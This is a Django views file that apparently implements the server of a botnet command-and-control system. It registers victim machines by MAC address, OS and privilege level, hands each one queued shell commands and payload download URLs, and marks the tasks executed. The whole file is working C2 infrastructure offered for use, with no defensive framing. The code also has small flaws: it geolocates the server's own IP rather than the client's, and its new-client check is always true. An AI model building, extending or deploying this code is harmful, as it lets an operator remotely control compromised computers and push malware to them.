from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils.timezone import now
from django.shortcuts import get_object_or_404
from .models import Client, Command
import json
from urllib.request import urlopen

@csrf_exempt
def register(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)

            mac = data.get('mac')
            status = data.get('status', 'offline')
            os = data.get('os')
            arch = data.get('arch')
            ip_address = data.get('ip_address')
            privileges = data.get('privileges')
            url = 'http://ipinfo.io/json'
            response = urlopen(url)
            ipinfo = json.load(response)
            country = ipinfo['country']

            if not mac:
                return JsonResponse({'error': 'Missing mac'}, status=400)

            created = Client.objects.update_or_create(
                mac=mac,
                defaults={
                    'status': status,
                    'os': os,
                    'arch': arch,
                    'ip_address': ip_address,
                    'privileges': privileges,
                    'country': country if country else 'None',
                    'last_seen': now()
                }
            )

            if created:
                message = "New client registered"
            else:
                message = "Client updated"

            return JsonResponse({"status": message}, status=200)

        except json.JSONDecodeError:
            return JsonResponse({'error': 'Invalid JSON payload'}, status=400)
        except Exception as e:
            return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
def get_command(request):
    if request.method == 'GET':
        mac = request.GET.get('mac')
        client = get_object_or_404(Client, mac=mac)
        client.last_seen = now()
        client.save()
        
        command = Command.objects.filter(bot_id=client.id, executed=0).values().first()
        print(f"command: {command}")
        if command:
            return JsonResponse({
                "command": command["command"],
                "payload_url": command["payload_url"],
                "args": command["args"]
            })
        else:
            return JsonResponse({}, status=204)

@csrf_exempt
def post_result(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            mac = data.get('mac')

            client = get_object_or_404(Client, mac=mac)

            command = Command.objects.filter(bot=client, executed=0).first()
            if command:
                command.executed = 1
                command.save()

            return JsonResponse({"status": "success"}, status=200)
        except Exception as e:
            return JsonResponse({"error": str(e)}, status=400)

@csrf_exempt
def send_command_to_clients(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            macs = data.get('macs')
            command = data.get('command')
            payload_url = data.get('payload_url')
            args = data.get('args')

            if not macs or (not command and not payload_url):
                return JsonResponse({'error': 'Invalid input'}, status=400)

            selected_clients = Client.objects.filter(mac__in=macs)

            for client in selected_clients:
                Command.objects.create(
                    bot=client,
                    command=command if command else '',
                    payload_url=payload_url if payload_url else '',
                    args=args
                )

            return JsonResponse({'status': 'Command sent to selected clients'}, status=200)

        except Exception as e:
            return JsonResponse({'error': str(e)}, status=400)
